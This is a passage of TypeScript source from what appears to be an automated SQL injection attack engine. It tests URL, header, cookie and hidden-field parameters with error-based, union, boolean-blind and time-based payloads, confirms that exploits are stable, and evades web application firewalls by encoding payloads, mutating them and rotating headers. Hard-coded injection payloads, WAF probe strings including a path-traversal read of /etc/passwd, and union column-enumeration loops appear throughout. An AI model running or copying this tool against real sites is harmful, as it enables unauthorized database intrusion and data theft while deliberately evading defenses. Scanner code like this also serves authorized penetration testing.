    const aggressiveMode = isKnownVulnerableTarget(url);
    const thresholds = aggressiveMode ? AGGRESSIVE_MODE_THRESHOLDS : CONFIDENCE_THRESHOLDS;
    
    if (aggressiveMode) {
      await this.onLog("info", `[AggressiveMode] Using lowered thresholds for known vulnerable target`);
    }
    
    let stabilityScore = 0;
    // Skip stability check in aggressive mode for single-class success
    if (classCount >= 2 || !aggressiveMode) {
      if (classCount >= 2) {
        const stability = await this.verifyExploitStability(
          url, paramName, payload, payloadClass, baseline, context, sessionCookies
        );
        stabilityScore = stability.stabilityScore;
      }
    }

    // AGGRESSIVE MODE DECISION LOGIC:
    // - Any repeatable DB error → CONFIRMED
    // - Any stable boolean difference → CONFIRMED  
    // - Any consistent timing deviation → HIGHLY_LIKELY
    
    // Error-based detection gets immediate CONFIRMED status
    const hasErrorBased = successfulClasses.some(c => c.class === "error" && c.confirmations >= 2);
    const hasBooleanBased = successfulClasses.some(c => c.class === "blind-boolean" && c.confirmations >= 2);
    const hasTimeBased = successfulClasses.some(c => c.class === "blind-time" && c.confirmations >= 2);
    
    // Fast path: repeatable error = immediate CONFIRMED
    if (hasErrorBased) {
      const confidence = Math.min(100, 90 + (classCount * 3));
      await this.onLog("info", `[Decision] Repeatable DB error detected → SQLi CONFIRMED`);
      return { level: "CONFIRMED", confidence, stabilityScore: 100 };
    }
    
    // Fast path: stable boolean difference = CONFIRMED
    if (hasBooleanBased) {
      const confidence = Math.min(98, 85 + (classCount * 3));
      await this.onLog("info", `[Decision] Stable boolean difference detected → SQLi CONFIRMED`);
      return { level: "CONFIRMED", confidence, stabilityScore: 90 };
    }
    
    // Time-based with confirmations = HIGHLY_LIKELY
    if (hasTimeBased) {
      const confidence = Math.min(94, 80 + (classCount * 3));
      await this.onLog("info", `[Decision] Consistent timing deviation detected → SQLi HIGHLY_LIKELY`);
      return { level: "HIGHLY_LIKELY", confidence, stabilityScore: 75 };
    }

    // Standard thresholds for remaining cases
    if (classCount >= thresholds.CONFIRMED.minClasses && 
        stabilityScore >= thresholds.CONFIRMED.minStability) {
      const confidence = Math.min(100, 85 + (classCount * 3) + (stabilityScore / 10));
      return { level: "CONFIRMED", confidence, stabilityScore };
    }

    if (classCount >= thresholds.HIGHLY_LIKELY.minClasses && 
        stabilityScore >= thresholds.HIGHLY_LIKELY.minStability) {
      const confidence = Math.min(94, 75 + (classCount * 5) + (stabilityScore / 15));
      return { level: "HIGHLY_LIKELY", confidence, stabilityScore };
    }

    if (classCount >= thresholds.POTENTIAL.minClasses) {
      const confidence = 50 + (classCount * 10) + (stabilityScore / 20);
      return { level: "POTENTIAL", confidence, stabilityScore };
    }

    return { level: "REJECTED", confidence: Math.max(0, classCount * 20), stabilityScore };
  }

  private async testAllPayloadClasses(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<PayloadClassResult[]> {
    const results: PayloadClassResult[] = [];
    const startTime = Date.now();

    // PHASE 1: Error-based (highest priority, fastest)
    const highAcquired = await tieredConcurrency.acquireHigh(this.abortSignal);
    if (!highAcquired || this.checkCancellation()) {
      return results;
    }
    try {
      const errorResult = await Promise.race([
        this.testErrorBasedClass(url, paramName, baseline, context, sessionCookies),
        this.createTimeoutResult("error", ERROR_PHASE_TIMEOUT)
      ]);
      results.push(errorResult);
      
      // If error-based succeeds, we have high confidence - skip slow tests
      if (errorResult.success) {
        await this.onLog("info", `[SQLi] Error-based detection succeeded for '${paramName}' - fast path`);
        // Still run boolean for confirmation, but skip time-based
        const booleanResult = await Promise.race([
          this.testBooleanBlindClass(url, paramName, baseline, context, sessionCookies),
          this.createTimeoutResult("blind-boolean", BOOLEAN_PHASE_TIMEOUT)
        ]);
        results.push(booleanResult);
        return results;
      }
    } catch (e) {
      await this.onLog("warn", `[SQLi] Error phase failed: ${e}`);
      results.push({ class: "error", success: false, payload: "", evidence: "Phase timeout", confirmations: 0 });
    } finally {
      tieredConcurrency.releaseHigh();
    }

    // Check total time budget
    if (Date.now() - startTime > PARAMETER_TOTAL_TIMEOUT * 0.5) {
      await this.onLog("warn", `[SQLi] Time budget exceeded for '${paramName}' - skipping remaining phases`);
      return results;
    }

    // PHASE 2: Boolean-based (primary detection)
    try {
      const booleanResult = await Promise.race([
        this.testBooleanBlindClass(url, paramName, baseline, context, sessionCookies),
        this.createTimeoutResult("blind-boolean", BOOLEAN_PHASE_TIMEOUT)
      ]);
      results.push(booleanResult);
    } catch (e) {
      await this.onLog("warn", `[SQLi] Boolean phase failed: ${e}`);
      results.push({ class: "blind-boolean", success: false, payload: "", evidence: "Phase timeout", confirmations: 0 });
    }

    // PHASE 3: Union-based (parallel with time budget check)
    if (Date.now() - startTime < PARAMETER_TOTAL_TIMEOUT * 0.6) {
      try {
        const unionResult = await Promise.race([
          this.testUnionBasedClass(url, paramName, baseline, context, sessionCookies),
          this.createTimeoutResult("union", ERROR_PHASE_TIMEOUT)
        ]);
        results.push(unionResult);
      } catch (e) {
        results.push({ class: "union", success: false, payload: "", evidence: "Phase timeout", confirmations: 0 });
      }
    }

    // PHASE 4: Time-based ONLY as fallback (strict limits, serialized)
    const successfulSoFar = results.filter(r => r.success).length;
    if (successfulSoFar === 0 && Date.now() - startTime < PARAMETER_TOTAL_TIMEOUT * 0.7) {
      await this.onLog("info", `[SQLi] No fast detection - trying time-based as fallback for '${paramName}'`);
      const lowAcquired = await tieredConcurrency.acquireLow(this.abortSignal);
      if (!lowAcquired || this.checkCancellation()) {
        return results;
      }
      try {
        const timeResult = await Promise.race([
          this.testTimeBlindClassLimited(url, paramName, baseline, context, sessionCookies),
          this.createTimeoutResult("blind-time", TIME_PHASE_TIMEOUT)
        ]);
        results.push(timeResult);
      } catch (e) {
        results.push({ class: "blind-time", success: false, payload: "", evidence: "Phase timeout", confirmations: 0 });
      } finally {
        tieredConcurrency.releaseLow();
      }
    } else if (successfulSoFar > 0) {
      await this.onLog("info", `[SQLi] Skipping time-based - already have ${successfulSoFar} successful detections`);
    }

    // Skip stacked queries unless we have clear evidence
    if (this.shouldTestStackedQueries(context.inferredBackend) && 
        results.some(r => r.success) &&
        Date.now() - startTime < PARAMETER_TOTAL_TIMEOUT * 0.8) {
      try {
        const stackedResult = await Promise.race([
          this.testStackedClass(url, paramName, baseline, context, sessionCookies),
          this.createTimeoutResult("stacked", ERROR_PHASE_TIMEOUT)
        ]);
        results.push(stackedResult);
      } catch (e) {
        // Ignore stacked failure
      }
    }

    return results;
  }

  private async createTimeoutResult(classType: PayloadClass, timeoutMs: number): Promise<PayloadClassResult> {
    await sleep(timeoutMs);
    return { class: classType, success: false, payload: "", evidence: `Timeout after ${timeoutMs/1000}s`, confirmations: 0 };
  }

  private async verifyExploitStability(
    url: string,
    paramName: string,
    payload: string,
    payloadClass: PayloadClass,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<StabilityVerification> {
    await this.onLog("info", `[Stability] Verifying exploit stability for '${paramName}' with ${STABILITY_TEST_COUNT} attempts...`);

    const responses: RequestResult[] = [];
    let successes = 0;

    for (let i = 0; i < STABILITY_TEST_COUNT; i++) {
      if (this.checkCancellation()) break;
      
      await this.defenseAwareness.waitForPacing();
      
      const response = await this.makeDefenseAwareRequest(url, paramName, payload, sessionCookies);
      responses.push(response);

      const isSuccess = await this.validatePayloadResponse(response, payloadClass, baseline, context, payload);
      if (isSuccess) {
        successes++;
      }

      await sleep(this.requestDelay);
    }

    const stabilityScore = Math.round((successes / STABILITY_TEST_COUNT) * 100);
    const isStable = stabilityScore >= STABILITY_THRESHOLD;

    await this.onLog("info", `[Stability] Result: ${successes}/${STABILITY_TEST_COUNT} consistent (${stabilityScore}%) - ${isStable ? "STABLE" : "UNSTABLE"}`);

    return {
      attempts: STABILITY_TEST_COUNT,
      successes,
      stabilityScore,
      isStable,
      responses,
    };
  }

  private async validatePayloadResponse(
    response: RequestResult,
    payloadClass: PayloadClass,
    baseline: BaselineMetrics,
    context: ParameterContext,
    payload: string
  ): Promise<boolean> {
    if (response.error) return false;

    switch (payloadClass) {
      case "error":
        const { patterns } = this.extractErrorPatterns(response.body);
        return patterns.length > 0;

      case "union":
        return response.status === 200 && 
               hashString(response.body) !== baseline.bodyHash &&
               this.hasSignificantNewContent(baseline.body, response.body);

      case "blind-boolean":
        return response.status === 200;

      case "blind-time":
        const minExpectedDelay = TIME_DELAYS[0] * 1000;
        return response.responseTime >= baseline.latencyBaseline.threshold &&
               response.responseTime >= minExpectedDelay * 0.7;

      case "stacked":
        const stackedDelay = TIME_DELAYS[0] * 1000;
        return response.responseTime >= stackedDelay * 0.7;

      default:
        return false;
    }
  }

  private async detectWAFWithDefenseAwareness(url: string, paramName: string): Promise<void> {
    // Skip WAF probing if WAF was already detected
    // DefenseAwareness continues to learn from every request via makeDefenseAwareRequest
    const wafProfile = this.defenseAwareness.getWAFProfile();
    if (wafProfile.detected) {
      return; // WAF already detected, skip redundant probing
    }

    const wafProbes = [
      "' OR 1=1--",
      "<script>alert(1)</script>",
      "../../etc/passwd",
      "UNION SELECT",
    ];

    for (const probe of wafProbes) {
      if (this.checkCancellation()) break;
      
      await this.trackAndPace(paramName);
      const probeUrl = injectPayload(url, paramName, probe);
      try {
        const response = await this.request(probeUrl, { timeout: 5000 });
        await this.defenseAwareness.analyzeResponse(response, url, probe);
      } catch (error) {
        await this.onLog("warn", `[WAF] Probe error: ${error}`).catch(() => {});
      }
      await sleep(100);
    }

    const updatedWafProfile = this.defenseAwareness.getWAFProfile();
    if (updatedWafProfile.detected) {
      await this.onLog("warn", `[Defense] WAF detected: ${updatedWafProfile.vendor || 'Unknown'}, bypass strategies: ${updatedWafProfile.bypassStrategies.slice(0, 3).join(", ")}`);
    }
  }

  private async makeDefenseAwareRequest(
    url: string,
    paramName: string,
    payload: string,
    sessionCookies?: Record<string, string>
  ): Promise<RequestResult> {
    await this.trackAndPace(paramName);
    await this.defenseAwareness.waitForPacing();

    const wafProfile = this.defenseAwareness.getWAFProfile();
    let payloadsToTry = [payload];
    let encodingUsed = "none";
    
    if (wafProfile.detected) {
      const strategy = this.defenseAwareness.getNextEncodingStrategy();
      const encodedPayload = this.defenseAwareness.encodePayload(payload, strategy);
      encodingUsed = strategy;
      
      payloadsToTry = [encodedPayload, ...this.applyWAFBypassMutations(payload).slice(0, 3)];
    }
    
    // Get rotated headers per request for WAF bypass
    const rotatedHeaders = this.defenseAwareness.getRotatedHeaders();
    const headers: Record<string, string> = { ...rotatedHeaders };
    if (sessionCookies && Object.keys(sessionCookies).length > 0) {
      headers.Cookie = Object.entries(sessionCookies).map(([k, v]) => `${k}=${v}`).join("; ");
    }

    const isHeaderInjection = paramName.startsWith("header:");
    const isHiddenFieldInjection = paramName.startsWith("hidden:");
    const isCookieInjection = paramName.startsWith("header:Cookie:");

    if (isHeaderInjection) {
      const headerName = isCookieInjection 
        ? paramName.replace("header:Cookie:", "")
        : paramName.replace("header:", "");
      await this.onLog("info", `Testing header injection: ${headerName}`);
    }

    for (const tryPayload of payloadsToTry) {
      if (this.checkCancellation()) {
        return { url, error: "cancelled", errorType: "aborted", status: 0, body: "", headers: {}, responseTime: 0, contentLength: 0 };
      }
      
      let testUrl = url;
      let requestHeaders = { ...headers };
      let requestMethod: "GET" | "POST" = "GET";
      let requestData: any = undefined;

      if (isHeaderInjection) {
        if (isCookieInjection) {
          const cookieName = paramName.replace("header:Cookie:", "");
          const existingCookies = requestHeaders.Cookie || "";
          const cookieParts = existingCookies.split("; ").filter(c => !c.startsWith(`${cookieName}=`));
          cookieParts.push(`${cookieName}=${tryPayload}`);
          requestHeaders.Cookie = cookieParts.join("; ");
        } else {
          const headerName = paramName.replace("header:", "");
          requestHeaders[headerName] = tryPayload;
        }
      } else if (isHiddenFieldInjection) {
        const fieldName = paramName.replace("hidden:", "");
        requestMethod = "POST";
        requestData = { [fieldName]: tryPayload };
        requestHeaders["Content-Type"] = "application/x-www-form-urlencoded";
      } else {
        testUrl = injectPayload(url, paramName, tryPayload);
      }
      
      try {
        const response = await this.request(testUrl, { 
          timeout: 15000,
          method: requestMethod,
          headers: Object.keys(requestHeaders).length > 0 ? requestHeaders : undefined,
          data: requestData,
        });

        const analysis = await this.defenseAwareness.analyzeResponse(response, url, tryPayload);
        
        if (this.trafficLogger) {
          await this.trafficLogger.logRequest(
            testUrl,
            requestMethod,
            response,
            {
              payload: tryPayload,
              parameterName: paramName,
              payloadType: this.classifyPayloadType(payload),
              encodingUsed: encodingUsed,
              detectionResult: analysis.isBlocked ? "Blocked" : (response.status >= 200 && response.status < 300 ? "Sent" : `HTTP ${response.status}`),
              headers: requestHeaders,
            }
          );
        }
        
        if (!analysis.isBlocked) {
          return response;
        }
        
        if (!analysis.shouldRetry) {
          return response;
        }
        
        await sleep(analysis.recommendedDelay);
      } catch (error) {
        await this.onLog("warn", `[Request] Error making request: ${error}`).catch(() => {});
        return { url: testUrl, error: String(error), errorType: "unknown", status: 0, body: "", headers: {}, responseTime: 0, contentLength: 0 };
      }
    }

    let finalTestUrl = url;
    let finalHeaders = { ...headers };
    let finalMethod: "GET" | "POST" = "GET";
    let finalData: any = undefined;

    if (isHeaderInjection) {
      if (isCookieInjection) {
        const cookieName = paramName.replace("header:Cookie:", "");
        const existingCookies = finalHeaders.Cookie || "";
        const cookieParts = existingCookies.split("; ").filter(c => !c.startsWith(`${cookieName}=`));
        cookieParts.push(`${cookieName}=${payloadsToTry[0]}`);
        finalHeaders.Cookie = cookieParts.join("; ");
      } else {
        const headerName = paramName.replace("header:", "");
        finalHeaders[headerName] = payloadsToTry[0];
      }
    } else if (isHiddenFieldInjection) {
      const fieldName = paramName.replace("hidden:", "");
      finalMethod = "POST";
      finalData = { [fieldName]: payloadsToTry[0] };
      finalHeaders["Content-Type"] = "application/x-www-form-urlencoded";
    } else {
      finalTestUrl = injectPayload(url, paramName, payloadsToTry[0]);
    }

    try {
      const response = await this.request(finalTestUrl, { 
        timeout: 15000,
        method: finalMethod,
        headers: Object.keys(finalHeaders).length > 0 ? finalHeaders : undefined,
        data: finalData,
      });
      
      if (this.trafficLogger) {
        await this.trafficLogger.logRequest(
          finalTestUrl,
          finalMethod,
          response,
          {
            payload: payloadsToTry[0],
            parameterName: paramName,
            payloadType: this.classifyPayloadType(payload),
            encodingUsed: encodingUsed,
            detectionResult: response.status >= 200 && response.status < 300 ? "Sent" : `HTTP ${response.status}`,
            headers: finalHeaders,
          }
        );
      }
      
      return response;
    } catch (error) {
      return { url: finalTestUrl, error: String(error), errorType: "unknown", status: 0, body: "", headers: {}, responseTime: 0, contentLength: 0 };
    }
  }

  private classifyPayloadType(payload: string): string {
    const lowerPayload = payload.toLowerCase();
    if (lowerPayload.includes("sleep") || lowerPayload.includes("pg_sleep") || lowerPayload.includes("waitfor delay") || lowerPayload.includes("benchmark")) {
      return "time-based";
    }
    if (lowerPayload.includes("union") && lowerPayload.includes("select")) {
      return "union-based";
    }
    if (lowerPayload.includes("and 1=1") || lowerPayload.includes("and 1=2") || lowerPayload.includes("or 1=1")) {
      return "boolean-based";
    }
    if (lowerPayload.includes("extractvalue") || lowerPayload.includes("updatexml") || lowerPayload.includes("exp(") || lowerPayload.includes("concat(")) {
      return "error-based";
    }
    if (lowerPayload.includes(";") && (lowerPayload.includes("drop") || lowerPayload.includes("delete") || lowerPayload.includes("insert") || lowerPayload.includes("update"))) {
      return "stacked-query";
    }
    return "generic";
  }

  private async testErrorBasedClass(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<PayloadClassResult> {
    await this.onLog("info", `[Error-Based] Testing parameter '${paramName}'...`);

    const result: PayloadClassResult = {
      class: "error",
      success: false,
      payload: "",
      evidence: "",
      confirmations: 0,
    };

    const benignErrors = new Set<string>();
    for (let i = 0; i < 3; i++) {
      const benignPayload = randomString(6);
      const benignUrl = injectPayload(url, paramName, benignPayload);
      const response = await this.request(benignUrl, { timeout: 5000 });
      if (!response.error) {
        const { patterns } = this.extractErrorPatterns(response.body);
        patterns.forEach(p => benignErrors.add(p));
      }
      await sleep(50);
    }

    const dbType = context.inferredBackend !== "unknown" ? context.inferredBackend : this.detectedDbType;
    
    const contextAnalysis = ContextAnalyzer.analyzeParameter(context.originalValue, paramName);
    await this.onLog("info", `[Context] Parameter '${paramName}' detected as: ${contextAnalysis.type}, numeric: ${contextAnalysis.isNumeric}, parentheses: ${contextAnalysis.parenthesesDepth}`);
    
    const repoDbType = dbType !== "unknown" ? dbType as PayloadDbType : "generic";
    const repositoryPayloads = globalPayloadRepository.getPayloadsByCategoryAndDatabase("error_based", repoDbType);
    const verbosePayloads = globalPayloadRepository.getVerboseErrorPayloads(repoDbType);
    const authBypassPayloads = globalPayloadRepository.getPayloadsByCategory("auth_bypass");
    
    const contextAwarePayloads = globalPayloadRepository.getContextAwarePayloads(contextAnalysis, "error_based");
    
    const payloadTemplates = [
      ...contextAwarePayloads,
      ...verbosePayloads.map(p => p.template),
      ...repositoryPayloads.map(p => p.template),
      ...authBypassPayloads.map(p => p.template),
      ...(dbType !== "unknown" ? DB_SPECIFIC_PAYLOADS[dbType].error : []),
      ...SQL_PAYLOADS.errorBased
    ];
    
    const withHex = globalPayloadRepository.applyHexEncodingToHighRisk(payloadTemplates.slice(0, 30));
    const withDoubleUrl = globalPayloadRepository.applyDoubleUrlEncodingToHighRisk(payloadTemplates.slice(0, 30));
    
    const allPayloads = [...payloadTemplates, ...withHex, ...withDoubleUrl];
    const uniquePayloads = Array.from(new Set(allPayloads));
    
    // CONTEXT-AWARE FILTERING: Apply context-based payload filtering
    const unfilteredCount = uniquePayloads.length;
    const filteredPayloads = this.filterPayloadsForContext(uniquePayloads, this.detectedContext, dbType);
    
    if (this.detectedContext !== "unknown") {
      await this.onLog("info", `Context detected: ${this.detectedContext}, filtering to ${filteredPayloads.length} matching payloads (from ${unfilteredCount})`);
    }
    
    const payloads = HEAVY_PAYLOAD_MODE ? filteredPayloads : filteredPayloads.slice(0, 50);
    
    await this.onLog("info", `[Error-Based] Testing ${payloads.length} context-tailored payloads (heavy mode: ${HEAVY_PAYLOAD_MODE})`);

    for (const payload of payloads) {
      if (this.checkCancellation()) break;
      
      // Live Payload View: Update current payload in ExecutionController
      const payloadType = this.classifyPayloadType(payload);
      this.executionController?.setCurrentPayload?.(payload, `ERROR-${payloadType.toUpperCase()}`, 0);
      this.executionController?.incrementPayloadsTested?.();
      
      const responses: RequestResult[] = [];
      
      for (let attempt = 0; attempt < MIN_CONFIRMATIONS; attempt++) {
        if (this.checkCancellation()) break;
        const response = await this.makeDefenseAwareRequest(url, paramName, payload, sessionCookies);
        if (response.error || response.status === 0) break;
        responses.push(response);
        await sleep(this.requestDelay);
      }

      if (responses.length < MIN_CONFIRMATIONS) continue;

      let consistentErrors = true;
      const firstErrors = this.extractErrorPatterns(responses[0].body);
      
      for (let i = 1; i < responses.length; i++) {
        const currErrors = this.extractErrorPatterns(responses[i].body);
        if (JSON.stringify(currErrors.patterns.sort()) !== JSON.stringify(firstErrors.patterns.sort())) {
          consistentErrors = false;
          break;
        }
      }

      if (!consistentErrors) continue;

      const newErrors = firstErrors.patterns.filter(p => !benignErrors.has(p));
      
      if (newErrors.length > 0) {
        result.success = true;
        result.payload = payload;
        result.evidence = `Database error patterns: ${newErrors.slice(0, 2).join(", ")}`;
        result.confirmations = responses.length;
        
        // Live Payload View: Update with high confidence on detection
        this.executionController?.setCurrentPayload?.(payload, "ERROR-CONFIRMED", 95);
        
        if (firstErrors.dbType !== "unknown") {
          this.detectedDbType = firstErrors.dbType;
          this.executionController?.setDetectedDbType?.(firstErrors.dbType);
        }
        break;
      }
    }

    return result;
  }

  private async testUnionBasedClass(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<PayloadClassResult> {
    await this.onLog("info", `[Union-Based] Testing parameter '${paramName}'...`);

    const result: PayloadClassResult = {
      class: "union",
      success: false,
      payload: "",
      evidence: "",
      confirmations: 0,
    };

    const garbageHashes: string[] = [];
    for (let i = 0; i < 3; i++) {
      const garbagePayload = `' ${randomString(10)} garbage_${randomString(8)}--`;
      const response = await this.makeDefenseAwareRequest(url, paramName, garbagePayload, sessionCookies);
      if (!response.error) {
        garbageHashes.push(hashString(response.body));
      }
      await sleep(this.requestDelay);
    }

    const unionPayloads: string[] = [];
    for (let cols = 1; cols <= 20; cols++) {
      const nulls = Array(cols).fill("NULL").join(",");
      if (context.type === "numeric") {
        unionPayloads.push(`1 UNION SELECT ${nulls}--`);
        unionPayloads.push(`1 UNION ALL SELECT ${nulls}--`);
        unionPayloads.push(`1) UNION SELECT ${nulls}--`);
        unionPayloads.push(`1)) UNION SELECT ${nulls}--`);
      } else {
        unionPayloads.push(`' UNION SELECT ${nulls}--`);
        unionPayloads.push(`' UNION ALL SELECT ${nulls}--`);
        unionPayloads.push(`') UNION SELECT ${nulls}--`);
        unionPayloads.push(`')) UNION SELECT ${nulls}--`);
      }
    }

    for (const payload of unionPayloads.slice(0, 40)) {
      if (this.checkCancellation()) break;
      
      const responses: RequestResult[] = [];
      for (let attempt = 0; attempt < MIN_CONFIRMATIONS; attempt++) {
        if (this.checkCancellation()) break;
        const response = await this.makeDefenseAwareRequest(url, paramName, payload, sessionCookies);
        responses.push(response);
        await sleep(this.requestDelay);
      }

      const validResponses = responses.filter(r => !r.error && r.status === 200);
      if (validResponses.length < MIN_CONFIRMATIONS) continue;

      const hashes = validResponses.map(r => hashString(r.body));
      const allSameHash = hashes.every(h => h === hashes[0]);
      const differentFromBaseline = hashes[0] !== baseline.bodyHash;
      const differentFromGarbage = !garbageHashes.includes(hashes[0]);

      const { patterns } = this.extractErrorPatterns(validResponses[0].body);
      const noErrors = patterns.length === 0;

      if (allSameHash && differentFromBaseline && differentFromGarbage && noErrors) {
        if (this.hasSignificantNewContent(baseline.body, validResponses[0].body)) {
          result.success = true;
          result.payload = payload;
          const colMatch = payload.match(/SELECT\s+((?:NULL,?)+|(?:'a',?)+)/i);
          const colCount = colMatch ? colMatch[1].split(",").length : "unknown";
          result.evidence = `UNION with ${colCount} columns returned new content`;
          result.confirmations = validResponses.length;
          break;
        }
      }
    }

    return result;
  }

  private async testBooleanBlindClass(
    url: string,
    paramName: string,
    baseline: BaselineMetrics,
    context: ParameterContext,
    sessionCookies?: Record<string, string>
  ): Promise<PayloadClassResult> {
    await this.onLog("info", `[Boolean-Blind] Testing parameter '${paramName}' with structural + behavioral diffing...`);

    const result: PayloadClassResult = {
      class: "blind-boolean",
      success: false,
      payload: "",
      evidence: "",
      confirmations: 0,
    };

    const contextAnalysis = ContextAnalyzer.analyzeParameter(context.originalValue, paramName);
    await this.onLog("info", `[Boolean-Blind Context] type: ${contextAnalysis.type}, numeric: ${contextAnalysis.isNumeric}, quoteChar: ${contextAnalysis.quoteChar}`);

    const repositoryBooleanPayloads = globalPayloadRepository.getPayloadsByCategory("boolean_based");
    
    let payloadSets: { true: string; false: string; desc: string }[] = [];
    
    if (contextAnalysis.isNumeric) {
      payloadSets = [
        { true: "1 AND 1=1", false: "1 AND 1=2", desc: "numeric" },
        { true: "1 AND 1=1--", false: "1 AND 1=2--", desc: "numeric-dash" },
        { true: " AND 1=1--", false: " AND 1=2--", desc: "noquote-dash" },
        { true: "-1 OR 1=1", false: "-1 OR 1=2", desc: "negative-or" },
        { true: "1 OR 1=1--", false: "1 OR 1=2--", desc: "numeric-or" },
        { true: "1) AND 1=1--", false: "1) AND 1=2--", desc: "numeric-paren" },
        { true: "1)) AND 1=1--", false: "1)) AND 1=2--", desc: "numeric-paren2" },
        { true: ") AND 1=1--", false: ") AND 1=2--", desc: "close-paren" },
        { true: ")) AND 1=1--", false: ")) AND 1=2--", desc: "close-paren2" },
        { true: "1 AND (SELECT 1)=1--", false: "1 AND (SELECT 1)=0--", desc: "numeric-subquery" },
      ];
    } else if (contextAnalysis.type === "double_quote") {
      payloadSets = [
        { true: "\" AND 1=1--", false: "\" AND 1=2--", desc: "dquote-dash" },
        { true: "\" AND \"a\"=\"a", false: "\" AND \"a\"=\"b", desc: "dquote-string" },
        { true: "\") AND (\"1\"=\"1", false: "\") AND (\"1\"=\"2", desc: "dquote-paren" },
        { true: "\" AND 1=1#", false: "\" AND 1=2#", desc: "dquote-hash" },
        { true: "\" AND (SELECT 1)=1--", false: "\" AND (SELECT 1)=0--", desc: "dquote-subquery" },
        { true: "\") AND 1=1--", false: "\") AND 1=2--", desc: "dquote-close-paren" },
        { true: "\")) AND 1=1--", false: "\")) AND 1=2--", desc: "dquote-close-paren2" },
      ];
    } else if (contextAnalysis.parenthesesDepth >= 1) {
      payloadSets = [
        { true: "') AND 1=1--", false: "') AND 1=2--", desc: "close-paren1" },
        { true: "')) AND 1=1--", false: "')) AND 1=2--", desc: "close-paren2" },
        { true: "') AND ('1'='1", false: "') AND ('1'='2", desc: "paren-balanced1" },
        { true: "')) AND (('1'='1", false: "')) AND (('1'='2", desc: "paren-balanced2" },
        { true: "' AND 1=1--", false: "' AND 1=2--", desc: "quote-dash" },
        { true: "' AND 'a'='a", false: "' AND 'a'='b", desc: "quote-string" },
      ];
    } else {
      payloadSets = [
        { true: "' AND 1=1--", false: "' AND 1=2--", desc: "quote-dash" },
        { true: "' AND 'a'='a", false: "' AND 'a'='b", desc: "quote-string" },
        { true: " AND 1=1--", false: " AND 1=2--", desc: "noquote-dash" },
        { true: "' AND 1=1#", false: "' AND 1=2#", desc: "quote-hash" },
        { true: "') AND ('1'='1", false: "') AND ('1'='2", desc: "paren-quote" },
        { true: "' AND 1=1-- -", false: "' AND 1=2-- -", desc: "quote-dash-space" },
        { true: "1' AND '1'='1", false: "1' AND '1'='2", desc: "prefix-quote" },
        { true: "' AND (SELECT 1)=1--", false: "' AND (SELECT 1)=0--", desc: "subquery" },
        { true: "' AND SUBSTRING('abc',1,1)='a'--", false: "' AND SUBSTRING('abc',1,1)='b'--", desc: "substring" },
      ];
    }
    
    await this.onLog("info", `[Boolean-Blind] Testing ${payloadSets.length} context-specific payload sets`);

    for (const payloadSet of payloadSets) {
      if (this.checkCancellation()) break;
      
      const truePayload = payloadSet.true;
      const falsePayload = payloadSet.false;
      
      // Live Payload View: Update current payload
      this.executionController?.setCurrentPayload?.(`TRUE: ${truePayload} / FALSE: ${falsePayload}`, `BOOLEAN-${payloadSet.desc.toUpperCase()}`, 0);
      this.executionController?.incrementPayloadsTested?.();

      const trueResponses: RequestResult[] = [];
      const falseResponses: RequestResult[] = [];

      for (let i = 0; i < MIN_CONFIRMATIONS; i++) {
        if (this.checkCancellation()) break;
        const trueResp = await this.makeDefenseAwareRequest(url, paramName, truePayload, sessionCookies);
        const falseResp = await this.makeDefenseAwareRequest(url, paramName, falsePayload, sessionCookies);
        
        if (!trueResp.error) trueResponses.push(trueResp);
        if (!falseResp.error) falseResponses.push(falseResp);
        
        await sleep(this.requestDelay);
      }

      if (trueResponses.length < MIN_CONFIRMATIONS || falseResponses.length < MIN_CONFIRMATIONS) continue;

      const trueNormalized = trueResponses.map(r => this.normalizeResponseForDiff(r.body));
      const falseNormalized = falseResponses.map(r => this.normalizeResponseForDiff(r.body));
      
      const trueHashes = trueNormalized.map(n => hashString(n));
      const falseHashes = falseNormalized.map(n => hashString(n));

      const trueConsistent = trueHashes.every(h => h === trueHashes[0]);
      const falseConsistent = falseHashes.every(h => h === falseHashes[0]);
      const trueAndFalseDifferent = trueHashes[0] !== falseHashes[0];

      const trueLengths = trueResponses.map(r => r.body.length);
      const falseLengths = falseResponses.map(r => r.body.length);
      const avgTrueLen = trueLengths.reduce((a, b) => a + b, 0) / trueLengths.length;
      const avgFalseLen = falseLengths.reduce((a, b) => a + b, 0) / falseLengths.length;
      
      const trueLenVariance = trueLengths.reduce((sum, l) => sum + Math.pow(l - avgTrueLen, 2), 0) / trueLengths.length;
      const falseLenVariance = falseLengths.reduce((sum, l) => sum + Math.pow(l - avgFalseLen, 2), 0) / falseLengths.length;
      
      const trueLenConsistent = avgTrueLen > 0 ? Math.sqrt(trueLenVariance) / avgTrueLen < BODY_LENGTH_TOLERANCE : true;
      const falseLenConsistent = avgFalseLen > 0 ? Math.sqrt(falseLenVariance) / avgFalseLen < BODY_LENGTH_TOLERANCE : true;
      
      const lengthDiffRatio = Math.abs(avgTrueLen - avgFalseLen) / Math.max(avgTrueLen, avgFalseLen, 1);
      const significantLengthDiff = lengthDiffRatio > BODY_LENGTH_TOLERANCE;

      // ENHANCED: DOM Tree Hash structural comparison using cheerio
      // Run DOM structural analysis on the first pair of responses
      const domDiffResults = trueResponses.map((tr, idx) => 
        compareDOMStructures(tr.body, falseResponses[idx]?.body || "")
      );
      
      // Check if DOM structure consistently differs across confirmations
      const domStructurallyDifferent = domDiffResults.filter(r => r.structurallyDifferent).length >= Math.ceil(MIN_CONFIRMATIONS * 0.66);
      const domHighConfidence = domDiffResults.some(r => r.confidence >= 40);
      const domEvidence = domDiffResults.find(r => r.structurallyDifferent)?.evidence || "";
      
      // Log DOM analysis for high-confidence findings
      if (domStructurallyDifferent && domHighConfidence) {
        const topDiff = domDiffResults.find(r => r.structurallyDifferent);
        if (topDiff && topDiff.missingElements.length > 0) {
          await this.onLog("info", `[DOM-Hash] ${topDiff.evidence}`);
        }
      }
      
      // SPECIAL CASE: Page size is identical but DOM hash differs
      // This is a strong indicator of boolean-blind SQLi with dynamic content replacement
      const sizesIdentical = Math.abs(avgTrueLen - avgFalseLen) < 10; // Within 10 bytes
      const domHashDiffers = domDiffResults.some(r => r.structurallyDifferent);
      const pageSameButDOMDifferent = sizesIdentical && domHashDiffers;
      
